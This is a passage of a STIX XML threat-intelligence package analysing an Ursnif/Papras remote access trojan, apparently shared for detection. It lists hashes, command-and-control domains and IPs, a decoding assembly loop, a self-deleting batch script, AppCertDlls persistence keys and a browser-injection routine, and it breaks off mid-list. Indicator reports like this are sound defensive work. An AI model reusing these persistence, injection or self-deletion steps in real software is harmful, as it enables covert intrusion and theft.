@@ -1,0 +1,1001 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:WinRegistryKeyObj="http://cybox.mitre.org/objects#WinRegistryKeyObject-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:marking="http://data-marking.mitre.org/Marking-1" id="CISCP:IB-13-10396" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Analysis of RAT and files used for its initialization</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On September 27, 2012 files used to load a packed Remote Access Trojan (RAT) were discovered and submitted for analysis. The malware was found to be capable of calling back to the following URL's and IP addresses: "makumazna.com.tw", "parti.com.tw", "64.62.146.103", "195.191.56.242", and "195.210.47.173".
+
+The RAT was found to be capable of performing various tasks on a remote host such as reboot/shutdown procedures, file downloading, malware version updating, process enumeration, digital certificate enumeration and exportation, file creation/modification/deletion and system information enumeration.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-0c85344b-ce0f-4430-806f-48c5e2ee32a6" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-c8456c84-9d54-482d-a9ac-b60ab4dd0830"/>
+        <indicator:Indicator idref="CISCP:indicator-a31d845b-b66e-47cd-af21-46abc3bed72d"/>
+        <indicator:Indicator idref="CISCP:indicator-09f65bcf-22be-49d7-ab00-7ef813e53072"/>
+        <indicator:Indicator idref="CISCP:indicator-2c445362-bdc1-42a8-a50c-116dba2adb07"/>
+        <indicator:Indicator idref="CISCP:indicator-fbee949b-a035-465e-ab17-212bb18a05bc"/>
+        <indicator:Indicator idref="CISCP:indicator-cbcee2c5-7f13-4efa-bb83-da67ff3badb9"/>
+        <indicator:Indicator idref="CISCP:indicator-badccf9a-9f88-4f64-9660-ab6ec5b03196"/>
+        <indicator:Indicator idref="CISCP:indicator-f0a5aa93-f669-4a3d-bfd1-68490310c7ba"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-c8456c84-9d54-482d-a9ac-b60ab4dd0830" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This file will be referred to as File-1.
+
+Antivirus Identifier:
+Kaspersky: Backdoor.Win32.Papras.fqw
+McAfee: Generic PWS.y!1kh
+Microsoft: TrojanSpy:Win32/Ursnif.FX
+Symantec: Backdoor.Trojan
+TrendMicro: TSPY_URSNIF.CX
+
+Packer: Borland Delphi 3.0 (???)
+Compile Date: 2012-09-24 11:23:43 UTC
+
+This file is a loader for an embedded file. When executed, the following events occur on the victim host:
+A memory region 0x1265 (4709) bytes in size is allocated and made executable. A decoding procedure begins starting with data at offset 0xD30 and ends at offset 0x2656. The algorithm parses the data one byte at time. The value 0x23 is subtracted from each byte. The result is then moved to the allocated buffer.
+
+ASSEMBLY FOR ALGORITHM:
+mov al, [ecx]
+sub al, 23h
+mov [esi], al
+movzx eax, byte ptr [ecx]
+and eax, 80000001h
+jns short loc_1042549
+dec eax
+or eax, 0FFFFFFFEh
+inc eax
+jnz short loc_104254D
+inc edx
+inc ecx
+movzx eax, byte ptr [ecx]
+add eax, 400h
+jz short loc_1042562
+inc esi
+inc edx
+inc ecx
+cmp edx, 1927h
+jb short loc_1042534
+
+The address for decoded buffer is then passed into the register EAX and executed. This buffer of code performs the following actions:
+API resolution is performed for necessary library calls and a UPX packed PE file is decoded. The PE file is unpacked, loaded into memory and executed. The decoded PE file is never written to disk and has no significant file name. It will be referred to as Residual_1.exe.
+
+RELEVANT STRING DATA 
+Gently poet he cutout matter.
+1278004970604833
+Shut with that rope for taught, behind, mail from constantly them accurate made greatly shake wide stung tears through send Martin doing require into line I've across sound refer on several wooden pour drink push from mistook popular board never principle divide language three at vegetable about cent came not become at whatever lend human threw seeing blew in front of building, behind tongue planning whenever in front of combine fell palace, who remove Indian without took, everyone for newspaper spill, pony recently, farm you'll limited wake him distant Russia shadow, Japanese creep sitting explain, suit, picture exist from swam pride Ann see with duty married cake over result they're military properly onto checkout deal yellow kitchen sunk are, coming through nodded largest simply at yard, let steady instance took in front of person tired shelter send market anywhere dug among dozen above Ben breakin reason diameter twelve after review across type parallel Alaska fit board total one substance western grandfather fresh spent high ill gradually difficult across brain education into mill fought silent sweep hot muscle, beneath enjoy completely above off officer barn broad I'd light at should worry fair tribe throw week body sold won, through, meet mood possibly wept promised skin product at, tool species cowboy flown across out worse see breakout wonder cutoff kitchen, guard wet harder grass, suggest column got about arrive either, paid in front of situation car beaten newspaper comedown herself author full work fight throw for south forgave current command, motion stuck, complete rise tail feed into cake let, depend wrong press frighten woke by enough heading ocean, dream constantly we place steady mental in dance see without last elephant, met properly, mark quit fat, again record fat sell height weren't, hear, under rock shut mathematics reader Rome at pitch old draw sell connected occur, sew fifty?
+
+RELEVANT RESOURCE DATA
+Name: String
+Label: 7
+Content:
+STRINGTABLE
+LANGUAGE LANG_NEUTRAL, SUBLANG_NEUTRAL
+{
+101, "Molecular We sat, show from Mars;"
+102, "Spread cost loss?"
+103, "Darkness one I faster lie whom sense."
+104, "Cloud, shown You itself bone production airplane;"
+105, "Noise foreign live dropped knelt seems doubt;"
+106, "Swept in front of shaking my, declared attack funny..."
+107, "Lot this choice has serve wind;"
+108, "Cap this haven't alphabet comedown born!"
+109, "Seven among I back."
+}
+Name: Version
+Label: 1
+Content:
+Length Of Struc: 0318h
+Length Of Value: 0034h
+Type Of Struc: 0000h
+Info: VS_VERSION_INFO
+Signature: FEEF04BDh
+Struc Version: 1.0
+File Version: 7.0.6.6
+Product Version: 7.0.6.6
+File Flags Mask: 0.63
+File Flags:
+File OS: NT (WINDOWS32)
+File Type: APP
+File SubType: UNKNOWN
+File Date: 00:00:00 00/00/0000
+Struc has Child(ren). Size: 700 bytes.
+Child Type: StringFileInfo
+Language/Code Page: 0/1200
+CompanyName: Watt Tieder &amp; Hoffar
+FileDescription: Apple England It sometime parallel.
+FileVersion: 7,0,6,6
+InternalName: may.exe
+LegalCopyright: Copyright (C) 2009
+OriginalFilename: may.exe
+ProductName: Apple England It sometime parallel.
+ProductVersion: 7,0,6,6
+Child Type: VarFileInfo
+Translation: 0/1200
+Name: Dialog
+Label: 110
+Content:
+110 DIALOGEX 0, 0, 492, 234, 0
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUPWINDOW | WS_DLGFRAME
+CAPTION "Orange simplest mine?"
+LANGUAGE LANG_NEUTRAL, SUBLANG_NEUTRAL
+FONT 8, "MS Shell Dlg"
+{
+PUSHBUTTON "many progress", 1001, 318, 163, 104, 14
+EDITTEXT "", 1002, 201, 162, 43, 14, ES_AUTOHSCROLL
+LTEXT "Doesn't mine children draw;", &#8208;1, 262, 136, 216, 8
+PUSHBUTTON "summer single", 1003, 341, 56, 104, 14
+LTEXT "Period union action;", &#8208;1, 394, 111, 160, 8
+}
+Name: Icon Entry
+Label: 1&#8208;5
+Content: This file contains multiple icons including a computer monitor with the letter "X", a white box with the letter "C" with a accent on top, a digital camera and what appears to be a calendar.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-51b6551a-d94f-4cf5-97d6-6af913bf14db">
+        <cybox:Object id="CISCP:Object-ca053ced-0725-4484-9562-7b0858bd76d9">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">may.exe </FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">289792</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">1665d3895867784d6f3736f40def08a3</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">d2061deb910189b5b14d46bb05b7c0a945dcc1de</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">6144:zxcfCGncxHRp1g0/Myk+hGB8FtuYzFuAmrPME:z+fCGnyHX6GvkyGBapMLME</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-09-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-a31d845b-b66e-47cd-af21-46abc3bed72d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This file will be referred to as File-2.
+
+Compile: Date 2012-09-24 11:23:40 UTC
+
+This file drops a DLL file embedded in its resource section. This file is UPX packed, memory resident, and is decoded and executed in memory by File-1 (MD5:1665d3895867784d6f3736f40def08a3). When executed, this file is responsible for the following actions on the victim host:
+The malware parses the command line for the following arguments:
+"/UPD"
+"/SD"
+
+The argument "/UPD" requires a process ID. If a valid PID is provided, the file enumerates the process module file name, terminates the target process, copies itself to the previously enumerated module file name and executes the new file with the following command line arguments:
+"/SD [PID]" (The PID value is the PID assigned to the original process)
+
+The arguments above instruct the file to terminate the original process by providing the original PID and to delete the original file from the victim host. This file name is enumerated by calling GetModuleFileNameExA. In this case, File-1 (MD5:1665d3895867784d6f3736f40def08a3) is deleted because File-2 (MD5: 07bf060fd30d784a0efbd8c61718a218) is never saved to the file system. If there are no command line statements, File-2 continues execution.
+
+The following strings are built:
+00145230 4C 6F 63 61 6C 5C 7B 34 63 64 37 34 30 65 64 2D Local\{4cd740ed-
+00145240 61 64 36 38 2D 33 31 61 37 2D 37 31 64 61 2D 33 ad68-31a7-71da-3
+00145250 35 61 65 63 62 31 63 32 66 31 30 7D 5aecb1c2f10}
+00145270 4C 6F 63 61 6C 5C 7B 61 Local\{a
+00145280 32 66 64 66 36 64 62 2D 62 65 37 65 2D 64 33 63 2fdf6db-be7e-d3c
+00145290 35 2D 33 66 36 30 2D 65 33 39 34 63 39 39 32 30 5-3f60-e394c9920
+001452A0 64 65 36 7D de6}
+
+A event is created with the name: "Local\{4cd740ed-ad68-31a7-71da-35aecb1c2f10}". The event is then closed.
+
+The resource "CLIENT32", which contains an encrypted PE file, is loaded and decrypted. The decrypted file is then saved to the location,  "c:\WINDOWS\system32\expammc.dll". If the file already exists, it is deleted. File-2 (MD5: 07bf060fd30d784a0efbd8c61718a218) has the capability to save the decrypted file to the following additional locations if read/write access is not possible on certain areas of the file system under the active user account:
+c:\WINDOWS
+c:\Documents and Settings\All Users\Application Data\
+c:\Documents and Settings\[user account]\Local Settings\temp\
+Present Working directory
+
+NOTE: File-2 contains an additional DLL file in its resources that is 64-bit. A Wow64 check is performed on the active process to determine if the file is running under the Windows 32-bit x86 emulator, Wow64. If it is, the file drops the 64-bit DLL with the file name "expammc64.dll". The procedure for dropping the 64-bit DLL is the same as described above for the 32 equivalent.
+
+The data in the following registry key is deleted:
+KEY: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\
+VALUE: "bootperf"
+The following key is set:
+KEY: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manger\AppCertDlls
+VALUE: "bootperf"
+DATA: [path to dll]
+
+If the entrenchment process is not successful, the DLL is executed via the "rundll32.exe" application with the command line below. This statement will execute the DLL and call the export "CreateProcessNotify".
+"rundll32 c:\WINDOWS\system32\expammc.dll,CreateProcessNotify"
+
+A running process list is created. File-2 parses the list for the following strings: "iexplore.exe" and "firefox.exe". If either of these applications are running, the DLL "expammc.dll" is injected into the process.
+
+A batch file is created with the purpose of deleting the original file, File-1 (MD5:1665d3895867784d6f3736f40def08a3) . The batch file is created in the present working directory of File-1 and is named based on the tick count of the victim host. The contents of the batch file are displayed below:
+attrib -s -r -h%1
+:hkiflg
+del %1
+if exist %1 goto hkiflg
+del %0
+
+NOTE: Argument "%0" represents the file path of the batch file. Argument %1 represents the file path of the file, File-1 (MD5:1665d3895867784d6f3736f40def08a3). The script will enable the "System", "Read-only" and "Hidden" file attributes of File-1 , delete the File-1, and delete itself.
+
+RELEVANT RESOURCE DATA
+Name: RC data
+Label: CLIENT32
+Content: This resource contains a compressed 32-bit PE file. The resource data begins with the string "AP32". The beginning of the data is displayed below:
+
+Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F
+00000000 41 50 33 32 18 00 00 00 77 20 01 00 DE 97 66 E4 AP32 w &#222;-f&#228;
+00000010 00 78 01 00 5B 29 07 E8 4D 38 5A 90 38 03 66 02 x [) &#232;M8Z8 f
+00000020 04 09 71 FF 81 B8 C2 91 01 40 C2 15 C6 E8 09 1C q&#255;&#184;&#194;&#8216; @&#194; &#198;&#232;
+00000030 0E 1F BA F8 00 B4 09 CD 21 B8 01 4C C0 0A 54 68 &#186;&#248; &#180; &#205;!&#184; L&#192; Th
+00000040 69 73 20 0E 70 72 6F 67 67 61 6D 87 63 47 6E 1F is proggam&#8225;cGn
+00000050 4F 74 E7 62 65 AF CF 75 5F 98 69 06 44 4F 7E 53 Ot&#231;be&#713;&#207;u_&#732;i DO~S
+
+Label: CLIENT64
+Content: This resource contains a compressed 64-bit PE file. The resource data begins with the string "AP32". The beginning of the data is displayed below:
+
+Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F
+00000000 41 50 33 32 18 00 00 00 9E 35 01 00 DA 89 21 9A AP32 &#382;5 &#218;&#8240;!&#353;
+00000010 00 80 01 00 F8 CB CD CA 4D 38 5A 90 38 03 66 02 &#8364; &#248;&#203;&#205;&#202;M8Z8 f
+00000020 04 09 71 FF 81 B8 C2 91 01 40 C2 15 C6 D8 09 1C q&#255;&#184;&#194;&#8216; @&#194; &#198;&#216;
+00000030 0E 1F BA F8 00 B4 09 CD 21 B8 01 4C C0 0A 54 68 &#186;&#248; &#180; &#205;!&#184; L&#192; Th
+00000040 69 73 20 0E 70 72 6F 67 67 61 6D 87 63 47 6E 1F is proggam&#8225;cGn
+00000050 4F 74 E7 62 65 AF CF 75 5F 98 69 06 44 4F 7E 53 Ot&#231;be&#713;&#207;u_&#732;i DO~S
+
+RELEVANT STRING DATA
+\*.exe
+CreateProcessNotify
+rundll32 "%s",%s
+Software\Microsoft\Windows\CurrentVersion\Run
+System\CurrentControlSet\Control\Session Manager\AppCertDlls
+iexplore.exe
+firefox.exe
+Local\
+/UPD
+/sd %lu
+/SD
+%lu.bat
+"%s"
+attrib -s -r -h%1
+:hkiflg
+del %1
+if exist %1 goto hkiflg
+del %0
+S:(ML;;NW;;;LW)
+D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GA;;;AU)(A;OICI;GA;;;BA)
+CLIENT32
+CLIENT64
+ZwWow64ReadVirtualMemory64
+ntdll.dll
+IsWow64Process
+KERNEL32.DLL
+Wow64EnableWow64FsRedirection
+ZwWow64QueryInformationProcess64
+{%08x-%04x-%04x-%04x-%08x%04x}</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-50114597-5580-42a7-b037-12af7e4a0794">
+        <cybox:Object id="CISCP:Object-c4646fb8-69cd-4a3f-aaa9-bacf6b33eb83">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:Size_In_Bytes condition="Equals">208384</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">07bf060fd30d784a0efbd8c61718a218</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">055ba3442c77c707edf2631b20aa216fc1eb160d</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:ShxbGTiVC/4qaNgGOCdZ7ch+FRvSdLvS7xuV/aRahdGTIIijBbmOncBGhnA:OVCNaeGOKAkFgLq4iIhdGTIZAUc4hn</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+          <cybox:Related_Objects>
+            <cybox:Related_Object id="CISCP:Object-22f50b1b-0bb7-433e-9ac6-4700a58d8f85">
+              <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
+                <WinRegistryKeyObj:Key condition="Equals">\System\CurrentControlSet\Control\Session Manger\AppCertDlls</WinRegistryKeyObj:Key>
+                <WinRegistryKeyObj:Hive condition="Equals">HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
+                <WinRegistryKeyObj:Values>
+                  <WinRegistryKeyObj:Value>
+                    <WinRegistryKeyObj:Name condition="Equals">"bootperf"</WinRegistryKeyObj:Name>
+                    <WinRegistryKeyObj:Data condition="Equals">[path to dll]</WinRegistryKeyObj:Data>
+                  </WinRegistryKeyObj:Value>
+                </WinRegistryKeyObj:Values>
+              </cybox:Properties>
+              <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Contains</cybox:Relationship>
+            </cybox:Related_Object>
+          </cybox:Related_Objects>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-09-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-09f65bcf-22be-49d7-ab00-7ef813e53072" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Antivirus Identifier:
+Kaspersky: Backdoor.Win32.Papras.fqx
+McAfee: Generic.bfr!gp
+Microsoft: TrojanSpy:Win32/Ursnif
+Symantec: Backdoor.Snifula.D
+TrendMicro: TSPY_URSNIF.CX
+
+Registry Key: "HKCU\Software\AppDataLow\{e396a1ec&#8208;345b&#8208;ddfe&#8208;e045&#8208;144912bf6663}"
+Value: "Version"
+Value: "k1"
+Value: "k2"
+Value: "s1"
+
+This DLL is a Remote Access Trojan that employs a packer to obfuscate its code. The file contains the following export functions:
+Ordinal: 1
+Name: DroveAsleep
+Entry Point: 0x10011D74
+
+Ordinal: 2
+Name: LoseHistory
+Entry Point: 0x10011D50
+
+Ordinal: 3
+Name: WorriedHow
+Entry Point: 0x10011DB8
+
+When executed, this DLL performs an unpacking procedure. The resulting file is packed using UPX. This file contains the export function, CreateProcessNotify. This export function is mentioned previously in the dropper file analysis. The UPX packed DLL has the following file information:
+
+Message-Digest algorithm
+----------------------------------------
+MD5: 09AEF24EEA187E753930C99514185F1E
+
+US Secure Hash Algorithm
+----------------------------------------
+SHA-1: 6E1B887743CAB1C4E3F94585DFD61D90A00D3E
+
+PE header
+----------------------------------------
+Signature: 00004550
+Machine: 014C, Intel 386
+Number of sections: 0003
+Time/Date stamp (local): 506042B5, 2012-09-24 07:23:33
+Time/Date stamp (UTC): 506042B5, 2012-09-24 11:23:33
+Pointer to symbol table: 00000000
+Number of symbols: 00000000
+Size of optional header: 00E0
+Characteristics: 2102, Executable, 32bit Machine Expected, DLL
+
+PE sections
+----------------------------------------
+UPX0
+UPX1
+UPX2
+
+Exports
+----------------------------------------
+CreateProcessNotify: 1, 00001872, 00000C72
+The UPX unpacked DLL has the following file information:
+
+Message-Digest algorithm
+----------------------------------------
+MD5: 1B26327EF1FF2C7E07A6CDEC0E824608
+
+US Secure Hash Algorithm
+----------------------------------------
+SHA-1: 5101DB0FBCAC53581D5316962A05C9860BEB80E6
+
+PE header
+----------------------------------------
+Signature: 00004550
+Machine: 014C, Intel 386
+Number of sections: 0004
+Time/Date stamp (local): 506042B5, 2012-09-24 07:23:33
+Time/Date stamp (UTC): 506042B5, 2012-09-24 11:23:33
+Pointer to symbol table: 00000000
+Number of symbols: 00000000
+Size of optional header: 00E0
+Characteristics: 2102, Executable, 32bit Machine Expected, DLL
+
+PE sections
+----------------------------------------
+.text
+.rdata
+.data
+.reloc
+
+Exports
+----------------------------------------
+CreateProcessNotify: 1, 00001872, 00000C72
+
+NOTE: The analysis below pertains to the DLL in its unpacked form.
+
+EXPORT ANALYSIS: CreateProcessNotify
+This file is injected into an Internet browser process by the residual file (Residual_1.exe). The export function "CreateProcessNotify" and its sub-routines are responsible for the following functionality:
+
+A Wow64 check is performed by the DLL on the Windows system process "explorer.exe". Wow64 is a built-in Microsoft infrastructure that allows 32-bit applications to run seamlessly in a 64-bit environment. This check allows the DLL to modify its behavior if Wow64 is present on the victim host. This procedure indicates that the DLL can execute on both 32 and 64 bit systems.
+
+The Windows process "explorer.exe" is opened and the DLL writes a buffer of code to the memory space of the Windows process. A remote thread is then created beginning at the buffer of copied code.
+
+DLL ENTRY POINT ANALYSIS:
+The following event occur during the execution of this code:
+
+A new mutex is created in UID format (example:"{22bca7ea-b641-1aac-be1b-d27fa005d409}"). Although the format is consistent (five series of characters separated by a "-" character), the characters are variable. The DLL enumerates the file it is running under and compares it to the following strings:
+iexplore.exe (Internet Explorer)
+firefox.exe (Mozilla Firefox)
+chrome.exe (Google Chrome)
+opera.exe (Opera Internet Browser)
+safari.exe (Apple Safari)
+explorer.exe (Windows System Process)
+
+The result of the comparison dictates the execution path. If the DLL is running under Internet Explorer (iexplore.exe) the DLL performs the following actions:
+
+1. The following registry values are created and set:
+Key: "HKEY_CURRENT_USER\Software\Microsoft\InternetExplorer\Main"
+Value: "NoProtectedBanner"
+Data: "0x00000001"
+
+Key: "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\3"
+Value: "2500"
+Data: "0x00000003"
+
+2. The module handle for the windows library "wininet.DLL" is enumerated to ensure
+the "iexplore.exe" process is running the DLL.
+
+If the DLL is running under Mozilla Firefox (firefox.exe) the DLL performs the following actions:
+1. The Firefox library nspr4.DLL is loaded into memory.
+
+If the DLL is running under Google Chrome (chrome.exe), Opera (opera.exe) or Apple Safari (safari.exe), the thread exits.
+
+If the DLL is running under the Windows process "explorer.exe" the same registry actions performed under the iexplore.exe condition are performed.
+
+A new thread is created beginning at offset 0x10008938. This thread is responsible for deleting the following registry key and then exits:
+Key: "HKEY_CURRENT_USER\Software\AppDataLow\{e396a1ec-345b-ddfe-e045-144912bf6663}"
+Value: "Version"
+
+The DLL creates the following registry key:
+Key: "HKEY_CURRENT_USER\Software\AppDataLow\{e396a1ec-345b-ddfe-e045-144912bf6663}"
+Value: "k1"
+Data: This field is populated with a four byte hex value based on a previously created GUID (Example: 0x3A46D58C).
+
+Key: "HKEY_CURRENT_USER\Software\AppDataLow\{e396a1ec-345b-ddfe-e045-144912bf6663}"
+Value: "k2"
+Data: This field is populated with a four byte hex value based on a previously created GUID (Example: 0x41DA81F1).
+
+Key: "HKEY_CURRENT_USER\Software\AppDataLow\{e396a1ec-345b-ddfe-e045-144912bf6663}"
+Value: "Version"
+Data: 0x00000028
+
+The DLL queries the data stored in the following registry value:
+Key: "HKEY_CURRENT_USER\Software\AllDataLow\{e396a1ec-345b-ddfe-e045-144912bf6663}"
+Value: "s1"
+Data: This value will contain an IP address or a URL and a port number.
+
+This value is meant to contain an IP address or URL. If this value does not exist, a new thread is created beginning at offset 0x10001E9F. If this value does exist, a new thread is created at offset 0x1000ED40.
+
+NOTE: The reporting source indicates the following possible values:
+makumazna.com.tw
+parti.com.tw
+64.62.146.103
+195.191.56.242
+195.210.47.173
+
+The thread beginning at offset 0x10001E9F performs the following actions:
+
+A named pipe is created. The name of the pipe is a string created previously. An example of the pipe name: "\\.\pipe\{a494de08-69c7-9c7a-bc91-b0554eeb624f}".
+
+A socket is created with one of the hardcoded IP address and the DLL connects to the IP address.
+
+The DLL is capable of performing the following tasks within this thread:
+1. Enumerating the available drive information
+2. Create, entrench and execute a file
+
